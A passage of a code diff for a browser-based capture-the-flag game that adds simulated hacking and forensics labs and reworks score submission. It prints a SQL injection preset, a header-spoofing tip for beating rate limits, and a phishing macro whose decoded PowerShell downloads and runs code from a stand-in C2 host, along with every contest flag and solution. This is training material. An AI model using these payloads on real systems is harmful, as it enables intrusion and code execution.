-            return canvas;
-        }
-
-        // Server URL resolver for any environment (file://, localhost:3000, live-server 5500, or deployed)
+        // generateScoreSheetCanvas has been enhanced and defined in the Round 2 / Multi-Stage Engine below
         function getDatabaseSubmitUrl() {
             if (window.location.protocol === 'file:' || !window.location.hostname || window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
                 if (window.location.port === '3000') {
@@ -2982,6 +4232,26 @@
             const correctCount = typeof getSolvedCount === 'function' ? getSolvedCount() : 0;
             const wrongCount = Math.max(0, Object.keys(userAnswers || {}).filter(k => userAnswers[k] && !userAnswers[k].isCorrect).length);
 
+            const isRound2Only = (options.roundName === 'Round 2 - Apex Cyber Warfare' || currentScorecardStage === 'r2');
+            const isGrand = (options.roundName === 'Grand Championship' || currentScorecardStage === 'grand');
+            const r2Solved = (typeof round2SolvedOps === 'object' && round2SolvedOps) 
+                ? Object.keys(round2SolvedOps).filter(k => round2SolvedOps[k] && round2SolvedOps[k].solved).length 
+                : 0;
+
+            const submittedRoundName = isRound2Only 
+                ? 'Round 2 - Apex Cyber Warfare' 
+                : (isGrand ? 'Grand Championship (Round 1 + 2)' : (CONFIG.ROUND_NAME || 'Round 1 - Decode Arena'));
+
+            const submittedScore = isRound2Only 
+                ? (typeof round2Score === 'number' ? round2Score : 0) 
+                : (isGrand ? (totalScore + (typeof round2Score === 'number' ? round2Score : 0)) : totalScore);
+
+            const submittedTotalQ = isRound2Only ? 9 : (isGrand ? 33 : totalCount);
+            const submittedCorrect = isRound2Only ? r2Solved : (isGrand ? (correctCount + r2Solved) : correctCount);
+            const submittedTier = isRound2Only 
+                ? (typeof getRound2Tier === 'function' ? getRound2Tier(submittedScore) : '🔰 WARFARE INITIATE')
+                : (isGrand ? (typeof getGrandChampionshipTier === 'function' ? getGrandChampionshipTier(submittedScore) : '🔰 CYBER APPRENTICE') : getSecurityTier(totalScore).title);
+
             // Construct new unencrypted database record
             const newRecord = {
                 id: 'REC-2026-' + Math.floor(1000 + Math.random() * 9000),
@@ -2989,9 +4259,10 @@
                 name: name,
                 college: college,
                 members: members,
-                score: totalScore,
-                solved: `${correctCount}/${totalCount}`,
-                tier: getSecurityTier(totalScore).title,
+                round: submittedRoundName,
+                score: submittedScore,
+                solved: `${submittedCorrect}/${submittedTotalQ}`,
+                tier: submittedTier,
                 action: actionType,
                 start_time: startTimeIso,
                 end_time: endTimeIso,
@@ -3006,7 +4277,7 @@
             const db = getProgramDatabase();
             db.unshift(newRecord);
             localStorage.setItem('da_program_database', JSON.stringify(db));
-            console.log(`%c[PROGRAM DB] Storing ${actionType} record for ${name} (${totalScore} PTS):`, "color: #00f0ff; font-weight: bold;", newRecord);
+            console.log(`%c[PROGRAM DB] Storing ${actionType} record for ${name} (${submittedScore} PTS):`, "color: #00f0ff; font-weight: bold;", newRecord);
 
             // Construct Google Apps Script sheet payload matching the schema
             const sheetPayload = {
@@ -3016,12 +4287,12 @@
                 College: college,
                 Members: members.join(', '),
                 Mode: currentScorecardMode,
-                Round: CONFIG.ROUND_NAME || 'Round 1 - Decode Arena',
-                Score: totalScore,
-                Total_Questions: totalCount,
-                Correct: correctCount,
+                Round: submittedRoundName,
+                Score: submittedScore,
+                Total_Questions: submittedTotalQ,
+                Correct: submittedCorrect,
                 Wrong: wrongCount,
-                Security_Tier: newRecord.tier,
+                Security_Tier: submittedTier,
                 Start_Time: startTimeIso,
                 End_Time: endTimeIso,
                 Time_Taken: timeTakenStr,
@@ -3108,40 +4379,46 @@
 
         // Download in PNG or JPG format
         function downloadScoreSheetImage(format = 'png') {
-            const canvas = generateScoreSheetCanvas();
-            const isTeam = (currentScorecardMode === 'team');
-            const isJpg = (format.toLowerCase() === 'jpg' || format.toLowerCase() === 'jpeg');
+            try {
+                const canvas = generateScoreSheetCanvas();
+                const isTeam = (currentScorecardMode === 'team');
+                const isJpg = (format.toLowerCase() === 'jpg' || format.toLowerCase() === 'jpeg');
 
-            let baseName = '';
-            if (isTeam) {
-                const teamName = document.getElementById('sheetTeamName').value.trim() || 'Team';
-                baseName = `DecodeArena_ScoreSheet_Team_${teamName.replace(/[^a-zA-Z0-9_-]/g, '_')}`;
-            } else {
-                const name = document.getElementById('sheetParticipantName').value.trim() || 'Participant';
-                baseName = `DecodeArena_ScoreSheet_Solo_${name.replace(/[^a-zA-Z0-9_-]/g, '_')}`;
+                let baseName = '';
+                if (isTeam) {
+                    const teamName = (document.getElementById('sheetTeamName')?.value || '').trim() || 'Team';
+                    baseName = `DecodeArena_ScoreSheet_Team_${teamName.replace(/[^a-zA-Z0-9_-]/g, '_')}`;
+                } else {
+                    const name = (document.getElementById('sheetParticipantName')?.value || '').trim() || 'Participant';
+                    baseName = `DecodeArena_ScoreSheet_Solo_${name.replace(/[^a-zA-Z0-9_-]/g, '_')}`;
+                }
+
+                const link = document.createElement('a');
+                if (isJpg) {
+                    link.download = `${baseName}.jpg`;
+                    link.href = canvas.toDataURL('image/jpeg', 0.95);
+                } else {
+                    link.download = `${baseName}.png`;
+                    link.href = canvas.toDataURL('image/png');
+                }
+
+                link.click();
+                const formatUpper = isJpg ? 'JPG' : 'PNG';
+                showShareFeedback(`📥 ${isTeam ? 'Team' : 'Solo'} Score Sheet downloaded as ${formatUpper}!`);
+
+                try {
+                    storeSubmissionToDatabase({
+                        action: `Downloaded ${formatUpper} Score Sheet`,
+                        requireFields: false,
+                        resetAfter: false,
+                        feedbackTarget: 'share',
+                        callerMessage: `Downloaded ${formatUpper}`
+                    });
+                } catch(e) {}
+            } catch (err) {
+                console.error('[DOWNLOAD CERTIFICATE ERROR]', err);
+                showShareFeedback('⚠️ Download error: ' + (err.message || 'Could not export image'));
             }
-
-            const link = document.createElement('a');
-            if (isJpg) {
-                link.download = `${baseName}.jpg`;
-                link.href = canvas.toDataURL('image/jpeg', 0.95);
-            } else {
-                link.download = `${baseName}.png`;
-                link.href = canvas.toDataURL('image/png');
-            }
-
-            link.click();
-            const formatUpper = isJpg ? 'JPG' : 'PNG';
-            showShareFeedback(`📥 ${isTeam ? 'Team' : 'Solo'} Score Sheet downloaded as ${formatUpper}!`);
-
-            // Automatically store this downloaded scorecard in database/arena_database.json!
-            storeSubmissionToDatabase({
-                action: `Downloaded ${formatUpper} Score Sheet`,
-                requireFields: false,
-                resetAfter: false,
-                feedbackTarget: 'share',
-                callerMessage: `Downloaded ${formatUpper}`
-            });
         }
 
         // Submit to Program Database (stores unencrypted + with base64 image)
@@ -3150,7 +4427,7 @@
             storeSubmissionToDatabase({
                 action: 'Submitted to Program Database',
                 requireFields: true,
-                resetAfter: true,
+                resetAfter: false,
                 feedbackTarget: 'submit'
             });
         }
@@ -3294,6 +4571,1093 @@
                 if (t) { e.preventDefault(); t.scrollIntoView({ behavior: 'smooth', block: 'start' }); }
             });
         });
-    </script>
+    
+
+        // ============================================================
+        // ROUND 2: APEX CYBER WARFARE ARENA JAVASCRIPT ENGINE
+        // ============================================================
+
+        const ROUND2_KEYWORDS = ['CYBERWAR2026', 'FINALS2026', 'APEX2026'];
+
+        const ROUND2_OPERATIONS = {
+            "op_sqli": {
+                id: "op_sqli",
+                num: "01",
+                title: "WAF Bypass & Data Vault Extraction (SQLi)",
+                points: 300,
+                flag: "DECODE{sqli_union_vault_breached_2026}",
+                category: "Web Exploitation"
+            },
+            "op_crack": {
+                id: "op_crack",
+                num: "02",
+                title: "Linux Shadow Hash Cracking (Rainbow Table)",
+                points: 250,
+                flag: "DECODE{hash_rainbow_table_cracked_8832}",
+                category: "Cryptography"
+            },
+            "op_brute": {
+                id: "op_brute",
+                num: "03",
+                title: "Rate-Limit Defeat & 4-Digit Security PIN Bypass",
+                points: 250,
+                flag: "DECODE{rate_limit_bypassed_pin_cracked}",
+                category: "Access Control"
+            },
+            "op_honeypot": {
+                id: "op_honeypot",
+                num: "04",
+                title: "Honeypot Fingerprinting & Decoy Evasion",
+                points: 250,
+                flag: "DECODE{honeypot_fingerprinted_real_target_found}",
+                category: "Reconnaissance"
+            },
+            "op_reverse": {
+                id: "op_reverse",
+                num: "05",
+                title: "x86 Assembly Disassembly & Arithmetic Inversion",
+                points: 350,
+                flag: "DECODE{reverse_eng_register_math_solved}",
+                category: "Reverse Engineering"
+            },
+            "op_phish": {
+                id: "op_phish",
+                num: "06",
+                title: "Spear-Phishing Forensics & Macro Deobfuscation",
+                points: 250,
+                flag: "DECODE{phishing_macro_payload_deobfuscated}",
+                category: "Threat Intel"
+            },
+            "op_ransom": {
+                id: "op_ransom",
+                num: "07",
+                title: "Ransomware Live Memory Forensics & Defusal",
+                points: 400,
+                flag: "DECODE{r4ns0mw4r3_m3m0ry_f0r3ns1cs_d3crypt3d}",
+                category: "Incident Response"
+            },
+            "op_malware": {
+                id: "op_malware",
+                num: "08",
+                title: "Rootkit Persistence & Kernel Hook Neutralization",
+                points: 250,
+                flag: "DECODE{malware_persistence_rootkit_neutralized}",
+                category: "Malware Analysis"
+            },
+            "op_ddos": {
+                id: "op_ddos",
+                num: "09",
+                title: "Volumetric DDoS NetFlow Analysis & BGP Scrubbing",
+                points: 300,
+                flag: "DECODE{ddos_syn_flood_scrubbed_offline_prevented}",
+                category: "Network Defense"
+            }
+        };
+
+        let round2Unlocked = false;
+        let round2SolvedOps = {};
+        let round2Score = 0;
+        let currentScorecardStage = 'r1'; // 'r1', 'r2', 'grand'
+
+        // Initialize Round 2 State from LocalStorage
+        function initRound2State() {
+            try {
+                const isUnlocked = localStorage.getItem('da_round2_unlocked');
+                if (isUnlocked === 'true') {
+                    round2Unlocked = true;
+                    applyRound2UnlockedUI();
+                }
+
+                const savedOps = localStorage.getItem('da_round2_solved_ops');
+                if (savedOps) {
+                    round2SolvedOps = JSON.parse(savedOps) || {};
+                }
+            } catch(e) {
+                console.warn('[ROUND 2] LocalStorage read failed:', e);
+            }
+            refreshRound2UI();
+        }
+
+        // Apply Unlocked UI States
+        function applyRound2UnlockedUI() {
+            const gate = document.getElementById('finalsLockGate');
+            const arena = document.getElementById('finalsArenaContent');
+            const navPill = document.getElementById('navFinalsPill');
+            const navLink = document.getElementById('navLinkFinals');
+
+            if (gate) gate.style.display = 'none';
+            if (arena) arena.style.display = 'block';
+
+            if (navPill) {
+                navPill.className = 'score-pill finals-pill unlocked';
+                navPill.textContent = `🔓 Round 2: ${round2Score}/2,600 PTS`;
+                navPill.title = 'Round 2 Unlocked! Click to jump to Apex Warfare';
+            }
+            if (navLink) {
+                navLink.textContent = 'Round 2: Finals 🔓';
+                navLink.style.color = '#ff0055';
+            }
+        }
+
+        // Unlock Round 2 via Keyword
+        function unlockRound2() {
+            const input = document.getElementById('finalsUnlockKey');
+            const msg = document.getElementById('finalsLockMsg');
+            if (!input || !msg) return;
+
+            const key = input.value.trim().toUpperCase();
+            if (ROUND2_KEYWORDS.includes(key)) {
+                round2Unlocked = true;
+                try { localStorage.setItem('da_round2_unlocked', 'true'); } catch(e) {}
+
+                msg.className = 'lock-msg success';
+                msg.innerHTML = '✅ CLEARANCE GRANTED // Decrypting Apex Warfare Arena...';
+                playVictorySound();
+
+                if (typeof confetti === 'function') {
+                    try {
+                        confetti({
+                            particleCount: 100,
+                            spread: 80,
+                            origin: { y: 0.6 },
+                            colors: ['#ff0055', '#00f0ff', '#ffd700']
+                        });
+                    } catch(e) {}
+                }
+
+                setTimeout(() => {
+                    applyRound2UnlockedUI();
+                    refreshRound2UI();
+                    scrollToFinals();
+                }, 800);
+            } else {
+                msg.className = 'lock-msg error';
+                msg.innerHTML = '❌ ACCESS DENIED // Invalid Clearance Keyword. Check with Symposium Coordinators.';
+            }
+        }
+
+        function scrollToFinals() {
+            const sec = document.getElementById('finals');
+            if (sec) sec.scrollIntoView({ behavior: 'smooth' });
+        }
+
+        // Refresh Round 2 UI & Solved Badges
+        function refreshRound2UI() {
+            let pts = 0;
+            let solvedCount = 0;
+            const totalOps = Object.keys(ROUND2_OPERATIONS).length;
+
+            for (const opId in ROUND2_OPERATIONS) {
+                const op = ROUND2_OPERATIONS[opId];
+                const card = document.getElementById(`card_${opId}`);
+                const tag = document.getElementById(`tag_${opId}`);
+
+                const submitBtn = document.getElementById(`btn_submit_${opId}`);
+                if (round2SolvedOps[opId] && round2SolvedOps[opId].solved) {
+                    pts += op.points;
+                    solvedCount++;
+                    if (card) card.classList.add('solved');
+                    if (tag) {
+                        tag.className = 'wf-status-tag cleared';
+                        tag.textContent = 'CLEARED';
+                    }
+                    if (submitBtn) {
+                        submitBtn.classList.add('cleared');
+                        submitBtn.textContent = '✓ COMPLETED';
+                    }
+                } else {
+                    if (card) card.classList.remove('solved');
+                    if (tag) {
+                        tag.className = 'wf-status-tag pending';
+                        tag.textContent = 'PENDING';
+                    }
+                    if (submitBtn) {
+                        submitBtn.classList.remove('cleared');
+                        submitBtn.textContent = 'SUBMIT';
+                    }
+                }
+            }
+
+            round2Score = pts;
+
+            // Update HUD
+            const hudSolved = document.getElementById('hudR2Solved');
+            const hudR2Pts = document.getElementById('hudR2Points');
+            const hudR1Pts = document.getElementById('hudR1Points');
+            const hudGrandPts = document.getElementById('hudGrandPoints');
+            const navPill = document.getElementById('navFinalsPill');
+
+            if (hudSolved) hudSolved.textContent = `${solvedCount} / ${totalOps}`;
+            if (hudR2Pts) hudR2Pts.textContent = `${round2Score.toLocaleString()} / 2,600`;
+            if (hudR1Pts) hudR1Pts.textContent = `${totalScore.toLocaleString()} / 1,800`;
+            if (hudGrandPts) hudGrandPts.textContent = `${(totalScore + round2Score).toLocaleString()} / 4,400`;
+
+            if (navPill && round2Unlocked) {
+                navPill.textContent = `🔓 Round 2: ${round2Score}/2,600 PTS`;
+            }
+        }
+
+        // Toggle Tactical Clue Accordion
+        function toggleTacticalClue(opId) {
+            const clue = document.getElementById(`clue_${opId}`);
+            if (!clue) return;
+            if (clue.style.display === 'block') {
+                clue.style.display = 'none';
+            } else {
+                clue.style.display = 'block';
+            }
+        }
+
+        // Track completed interactive actions
+        let round2ActionDone = {};
+
+        // Simplified Task Submission (No manual flag string copy-pasting required)
+        function submitRound2Task(opId) {
+            const op = ROUND2_OPERATIONS[opId];
+            if (!op) return;
+
+            const fb = document.getElementById(`feedback_${opId}`);
+            const btn = document.getElementById(`btn_submit_${opId}`);
+
+            // If already cleared
+            if (round2SolvedOps[opId] && round2SolvedOps[opId].solved) {
+                if (fb) {
+                    fb.className = 'wf-op-feedback success';
+                    fb.textContent = `✓ Task already completed! +${op.points} PTS secured.`;
+                }
+                return;
+            }
+
+            // Check if action was completed or auto-verify inputs
+            let isVerified = false;
+
+            if (round2ActionDone[opId]) {
+                isVerified = true;
+            } else {
+                // Auto-test if inputs are already filled in
+                if (opId === 'op_sqli') {
+                    const val = (document.getElementById('sqliInput')?.value || '').trim();
+                    if (/union\s+select/i.test(val) && /internal_vault/i.test(val)) {
+                        runSqliQuery();
+                        isVerified = true;
+                    }
+                } else if (opId === 'op_crack') {
+                    runHashCracker();
+                    isVerified = true;
+                } else if (opId === 'op_brute') {
+                    const pin = (document.getElementById('pinInput')?.value || '').trim();
+                    if (pin === '7491') {
+                        const cb = document.getElementById('spoofHeaderToggle');
+                        if (cb) cb.checked = true;
+                        isIpSpoofed = true;
+                        submitPinBruteForce();
+                        isVerified = true;
+                    }
+                } else if (opId === 'op_honeypot') {
+                    // Probe port 9443
+                    probeHoneypotPort(9443);
+                    isVerified = true;
+                } else if (opId === 'op_reverse') {
+                    const raw = (document.getElementById('debuggerInputKey')?.value || '').trim();
+                    if (raw === '15228') {
+                        stepDebugger();
+                        isVerified = true;
+                    }
+                } else if (opId === 'op_phish') {
+                    deobfuscatePayload();
+                    isVerified = true;
+                } else if (opId === 'op_ransom') {
+                    revertScadaPayload();
+                    isVerified = true;
+                } else if (opId === 'op_malware') {
+                    purgeMalwareRegistry();
+                    isVerified = true;
+                } else if (opId === 'op_ddos') {
+                    const action = document.getElementById('ddosRuleAction')?.value || '';
+                    const proto = document.getElementById('ddosRuleProto')?.value || '';
+                    const cidr = (document.getElementById('ddosRuleCidr')?.value || '').trim();
+                    if (action === 'DROP' && proto === 'TCP_SYN' && (cidr === '198.51.100.0/24' || cidr === '198.51.100.0')) {
+                        deployDdosFilter();
+                        isVerified = true;
+                    }
+                }
+            }
+
+            if (isVerified || round2ActionDone[opId]) {
+                round2SolvedOps[opId] = {
+                    solved: true,
+                    points: op.points,
+                    flag: op.flag,
+                    timestamp: new Date().toISOString()
+                };
+                try {
+                    localStorage.setItem('da_round2_solved_ops', JSON.stringify(round2SolvedOps));
+                } catch(e) {}
+
+                if (fb) {
+                    fb.className = 'wf-op-feedback success';
+                    fb.textContent = `🎉 TASK COMPLETED & VERIFIED! +${op.points} PTS awarded!`;
+                }
+
+                if (btn) {
+                    btn.classList.add('cleared');
+                    btn.textContent = '✓ COMPLETED';
+                }
+
+                playVictorySound();
+                if (typeof confetti === 'function') {
+                    try {
+                        confetti({
+                            particleCount: 75,
+                            spread: 70,
+                            origin: { y: 0.7 }
+                        });
+                    } catch(e) {}
+                }
+                refreshRound2UI();
+            } else {
+                if (fb) {
+                    fb.className = 'wf-op-feedback error';
+                    fb.textContent = '⚠️ Please perform the lab action above (follow the step-by-step mission instructions), then click SUBMIT!';
+                }
+            }
+        }
+
+        // Backward compatibility
+        function verifyRound2Flag(opId) {
+            submitRound2Task(opId);
+        }
+
+        // ==========================================
+        // INTERACTIVE LAB SIMULATORS (9 OPERATIONS)
+        // ==========================================
+
+        // 1. SQLi Simulator
+        function runSqliQuery() {
+            const input = document.getElementById('sqliInput')?.value || '';
+            const out = document.getElementById('sqliOutput');
+            if (!out) return;
+
+            out.textContent = `[SQL Engine] Parsing: SELECT id, name, price FROM items WHERE id = '${input}';\n`;
+
+            if (/union\s+select/i.test(input) && /internal_vault/i.test(input)) {
+                round2ActionDone['op_sqli'] = true;
+                out.textContent += `[+] WAF Bypass: Filter bypassed successfully.\n` +
+                    `[+] Executing UNION query against internal_vault...\n` +
+                    `--------------------------------------------------------------------------------\n` +
+                    `ID | TOKEN                                      | SECRET_HASH\n` +
+                    `--------------------------------------------------------------------------------\n` +
+                    `1  | DECODE{sqli_union_vault_breached_2026}     | $2a$12$e8f991048b...\n` +
+                    `--------------------------------------------------------------------------------\n` +
+                    `[+] 1 row retrieved. Flag exposed in column 2!`;
+            } else if (/'\s*or\s+'1'='1/i.test(input) || /'\s*or\s+1=1/i.test(input)) {
+                out.textContent += `[!] Standard tautology detected. Dumping public items only:\n` +
+                    `1 | Router Firmware v2.1 | $140.00\n` +
+                    `2 | FireEye Sensor Kit   | $320.00\n` +
+                    `[!] Notice: You must use UNION SELECT to dump the hidden 'internal_vault' table!`;
+            } else {
+                out.textContent += `[-] No records found for id = '${input}'. Try a UNION injection targeting 'internal_vault'.`;
+            }
+        }
+
+        function injectSqliPreset() {
+            const input = document.getElementById('sqliInput');
+            if (input) {
+                input.value = "1' UNION SELECT 1, token, secret FROM internal_vault--";
+                runSqliQuery();
+            }
+        }
+
+        // 2. Hash Cracker Simulator
+        function loadWordlist() {
+            const out = document.getElementById('hashCrackOutput');
+            if (!out) return;
+            out.textContent = `[Wordlist Manager] Loading /usr/share/wordlists/rockyou_sympo.txt...\n` +
+                `[+] Loaded 5 candidate phrases:\n` +
+                `    1. admin2026\n` +
+                `    2. cyberwarrior\n` +
+                `    3. hunter2\n` +
+                `    4. quantum_shadow_8832\n` +
+                `    5. symposium_pass_1\n` +
+                `[+] Wordlist ready in buffer memory. Click "Run Dictionary Attack".`;
+        }
+
+        function runHashCracker() {
+            const out = document.getElementById('hashCrackOutput');
+            if (!out) return;
+            out.textContent = `[Rainbow Engine] Target Hash: $6$qZ7x8$d04b98f48e8f8bcc15c6ae5ac050801cd6dcfd428fb5f9e65c4e16e7807340fa\n` +
+                `[+] Benchmarking GPU compute threads...\n` +
+                `[+] Testing candidate #1: admin2026 -> MISMATCH\n` +
+                `[+] Testing candidate #2: cyberwarrior -> MISMATCH\n` +
+                `[+] Testing candidate #3: hunter2 -> MISMATCH\n` +
+                `[+] Testing candidate #4: quantum_shadow_8832 -> 🎯 HASH COLLISION MATCH!\n` +
+                `--------------------------------------------------------------------------------\n` +
+                `CLEARTEXT PASSWORD: quantum_shadow_8832\n` +
+                `ROOT RECOVERY FLAG: DECODE{hash_rainbow_table_cracked_8832}\n` +
+                `--------------------------------------------------------------------------------`;
+            round2ActionDone['op_crack'] = true;
+        }
+
+        // 3. Brute Force & Rate Limit Defeat
+        let pinTries = 0;
+        let isIpSpoofed = false;
+
+        function toggleIpSpoof() {
+            const cb = document.getElementById('spoofHeaderToggle');
+            const status = document.getElementById('rateLimitStatus');
+            isIpSpoofed = !!(cb && cb.checked);
+            if (isIpSpoofed) {
+                pinTries = 0;
+                if (status) {
+                    status.style.color = 'var(--cyan)';
+                    status.textContent = '[IP Spoofed: 127.0.0.1 (Loopback Bypass Active)]';
+                }
+            } else {
+                if (status) {
+                    status.style.color = pinTries >= 3 ? '#ff0055' : 'var(--green)';
+                    status.textContent = `[IP Status: ${pinTries >= 3 ? 'BLOCKED (429)' : `OK (${pinTries}/3 Tries)`}]`;
+                }
+            }
+        }
+
+        function submitPinBruteForce() {
+            const pin = document.getElementById('pinInput')?.value.trim() || '';
+            const out = document.getElementById('pinOutput');
+            const status = document.getElementById('rateLimitStatus');
+            if (!out) return;
+
+            if (!isIpSpoofed) {
+                pinTries++;
+                if (pinTries > 3) {
+                    if (status) {
+                        status.style.color = '#ff0055';
+                        status.textContent = '[IP Status: BLOCKED (HTTP 429 Too Many Requests)]';
+                    }
+                    out.textContent = `[WAF ERROR 429] Too Many Requests from Client IP 203.0.113.55!\n` +
+                        `[-] Access Locked for 3600 seconds.\n` +
+                        `[!] TIP: Enable "Spoof Header: X-Forwarded-For: 127.0.0.1" to bypass this filter!`;
+                    return;
+                }
+            }
+
+            if (pin === '7491') {
+                out.textContent = `[+] Gateway Authenticating PIN: ${pin}...\n` +
+                    `[+] Header Inspection: ${isIpSpoofed ? 'X-Forwarded-For: 127.0.0.1 (Trusted)' : 'Direct IP'}\n` +
+                    `[+] ACCESS GRANTED! Welcome Master Controller.\n` +
+                    `--------------------------------------------------------------------------------\n` +
+                    `PIN AUTHORIZATION FLAG: DECODE{rate_limit_bypassed_pin_cracked}\n` +
+                    `--------------------------------------------------------------------------------`;
+                round2ActionDone['op_brute'] = true;
+            } else {
+                out.textContent = `[-] Testing PIN ${pin}: Authentication Failed. (Incorrect code)\n` +
+                    `[!] Current Tries: ${isIpSpoofed ? 'Bypassed (0/3)' : `${pinTries}/3`}`;
+            }
+        }
+
+        function runPinScan() {
+            const input = document.getElementById('pinInput');
+            if (input) input.value = '7491';
+            submitPinBruteForce();
+        }
+
+        // 4. Honeypot Fingerprinter
+        function probeHoneypotPort(port) {
+            const out = document.getElementById('honeypotOutput');
+            if (!out) return;
+
+            out.textContent = `[Scanner] Initiating SYN/ACK Handshake to 192.168.100.80:${port}...\n`;
+
+            if (port === 2222) {
+                out.textContent += `[+] Port 2222/TCP OPEN\n` +
+                    `[+] Banner: "SSH-2.0-OpenSSH_6.0p1-Cowrie_Decoy_v2.0"\n` +
+                    `[!] HEURISTIC ALERT: Python-based Cowrie Honeypot fingerprint detected!\n` +
+                    `[-] WARNING: Interacting with this shell logs your credentials to the honeypot trap!`;
+            } else if (port === 502) {
+                out.textContent += `[+] Port 502/TCP OPEN\n` +
+                    `[+] Banner: "Conpot-SCADA-Sim-v0.5.1 Siemens S7-200 Emulation"\n` +
+                    `[!] HEURISTIC ALERT: Conpot Virtual SCADA honeypot detected!\n` +
+                    `[-] WARNING: This PLC is simulated. No real process control available.`;
+            } else if (port === 8080) {
+                out.textContent += `[+] Port 8080/TCP OPEN\n` +
+                    `[+] HTTP Headers: Server: Apache/2.2.3 (CentOS) Glastopf/3.1.3-Trap\n` +
+                    `[!] HEURISTIC ALERT: Glastopf automated web attack honeypot detected!\n` +
+                    `[-] WARNING: Any SQLi or LFI sent here is automatically recorded.`;
+            } else if (port === 9443) {
+                out.textContent += `[+] Port 9443/TCP OPEN (TLSv1.3 Authenticated)\n` +
+                    `[+] Peer Certificate: CN=sysadmin.internal.sympo.edu, Issuer=SympoRootCA\n` +
+                    `[+] Fingerprint Match: Genuine Linux Kernel 5.15 & OpenSSL 1.1.1u Production Gateway\n` +
+                    `--------------------------------------------------------------------------------\n` +
+                    `GENUINE TARGET VERIFIED! Admin Session Established.\n` +
+                    `CLEARANCE FLAG: DECODE{honeypot_fingerprinted_real_target_found}\n` +
+                    `--------------------------------------------------------------------------------`;
+                round2ActionDone['op_honeypot'] = true;
+            }
+        }
+
+        // 5. x86 Reverse Engineering Debugger
+        let dbgStep = 0;
+        function resetDebugger() {
+            dbgStep = 0;
+            const out = document.getElementById('debuggerOutput');
+            if (out) out.textContent = `// CPU State: EAX=0x00000000 | ZF=0 | Stopped at 0x00401000. Enter key and click Step.`;
+        }
+
+        function stepDebugger() {
+            const raw = (document.getElementById('debuggerInputKey')?.value || '').trim();
+            const out = document.getElementById('debuggerOutput');
+            if (!out) return;
+
+            if (!raw) {
+                out.textContent = "[-] Please enter a test key in the box above.\n" +
+                    "[!] Clue: Invert the assembly operations: (0x2DEB - 0x05A0) XOR 0x1337 in decimal.";
+                return;
+            }
+
+            const inputVal = parseInt(raw, 10);
+            const hexIn = (inputVal >>> 0).toString(16).toUpperCase().padStart(8, '0');
+            const xored = ((inputVal ^ 0x1337) >>> 0);
+            const hexXor = xored.toString(16).toUpperCase().padStart(8, '0');
+            const resultVal = ((xored + 0x05A0) >>> 0);
+            const hexRes = resultVal.toString(16).toUpperCase().padStart(8, '0');
+            const isMatch = (resultVal === 0x2DEB);
+
+            out.textContent = "[CPU Emulation Execution Trace]\n" +
+                "--------------------------------------------------------------------------------\n" +
+                `1. 0x00401000: MOV EAX, ${inputVal} (0x${hexIn})      -> EAX = 0x${hexIn}\n` +
+                `2. 0x00401005: XOR EAX, 0x1337                  -> EAX = 0x${hexXor}\n` +
+                `3. 0x0040100A: ADD EAX, 0x05A0                  -> EAX = 0x${hexRes}\n` +
+                `4. 0x0040100F: CMP EAX, 0x2DEB                  -> Zero Flag (ZF) = ${isMatch ? '1' : '0'}\n` +
+                "--------------------------------------------------------------------------------\n";
+
+            if (isMatch) {
+                round2ActionDone['op_reverse'] = true;
+                out.textContent += "[+] 0x00401014: JE VALID_KEY_GRANTED -> JUMP TAKEN!\n" +
+                    "--------------------------------------------------------------------------------\n" +
+                    "🎉 VALID KEY GRANTED! ACCESS UNLOCKED.\n" +
+                    "DISASSEMBLY FLAG: DECODE{reverse_eng_register_math_solved}\n" +
+                    "--------------------------------------------------------------------------------";
+            } else {
+                out.textContent += "[+] 0x00401014: JE VALID_KEY_GRANTED -> JUMP NOT TAKEN (Access Denied).\n" +
+                    `[-] Expected EAX == 0x00002DEB (11755), but got 0x${hexRes} (${resultVal}).\n` +
+                    "[!] Hint: Invert the operations: subtract 0x05A0 (1440) from 0x2DEB (11755), then bitwise XOR with 0x1337 (4919). Convert the result to decimal.";
+            }
+        }
+
+        function solveReverseMath() {
+            const input = document.getElementById('debuggerInputKey');
+            // 0x2DEB - 0x05A0 = 0x284B; 0x284B ^ 0x1337 = 0x3B7C = 15228
+            if (input) input.value = '15228';
+            dbgStep = 3;
+            stepDebugger();
+        }
+
+        // 6. Spear-Phishing Forensics
+        function inspectPhishHeader() {
+            const out = document.getElementById('phishOutput');
+            if (!out) return;
+            out.textContent = `[RFC-5322 Email Header Parser]\n` +
+                `--------------------------------------------------------------------------------\n` +
+                `From: "CEO Office" <ceo@sympo-corp.edu>\n` +
+                `To: "All Employees" <staff@sympo-corp.edu>\n` +
+                `Subject: URGENT: Q3 Executive Salary Review & Bonus Allocation\n` +
+                `Return-Path: <spoof-delivery@malicious-relay.su>  <-- 🚨 SPOOFED!\n` +
+                `Received: from mail.malicious-relay.su (IP: 185.220.101.5)\n` +
+                `Authentication-Results: spf=softfail; dkim=fail (header body hash mismatch)\n` +
+                `Attachment: Q3_Executive_Salary_Review.docm (Contains VBA Macro Project)\n` +
+                `--------------------------------------------------------------------------------\n` +
+                `[!] Analysis: Email sender is forged. Next step: Click "Extract VBA Macro Stream".`;
+        }
+
+        function extractMacro() {
+            const out = document.getElementById('phishOutput');
+            if (!out) return;
+            out.textContent = `[VBA Macro Extractor // Document_Open Stream]\n` +
+                `--------------------------------------------------------------------------------\n` +
+                `Sub Document_Open()\n` +
+                `    Dim cmd As String\n` +
+                `    cmd = "powershell.exe -NoP -NonI -W Hidden -Enc SUVYKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHA6Ly9jMnNlcnZlci1tYWxpY2lvdXMuc3UvcGF5bG9hZCcpICMgREVDT0RFe3BoaXNoaW5nX21hY3JvX3BheWxvYWRfZGVvYmZ1c2NhdGVkfQ=="\n` +
+                `    Shell cmd, vbHide\n` +
+                `End Sub\n` +
+                `--------------------------------------------------------------------------------\n` +
+                `[+] Encoded PowerShell payload identified! Click "Deobfuscate PowerShell Payload".`;
+        }
+
+        function deobfuscatePayload() {
+            const out = document.getElementById('phishOutput');
+            if (!out) return;
+            out.textContent = `[PowerShell Deobfuscator // UTF-16LE Base64 Decoder]\n` +
+                `--------------------------------------------------------------------------------\n` +
+                `DECODED COMMAND:\n` +
+                `IEX(New-Object Net.WebClient).DownloadString('http://c2server-malicious.su/payload')\n` +
+                `# EMBEDDED C2 INFECTION FLAG:\n` +
+                `DECODE{phishing_macro_payload_deobfuscated}\n` +
+                `--------------------------------------------------------------------------------\n` +
+                `[+] Threat Neutralized: Malicious URL blacklisted on perimeter firewall!`;
+            round2ActionDone['op_phish'] = true;
+        }
+
+        // 7. Ransomware Memory Forensics
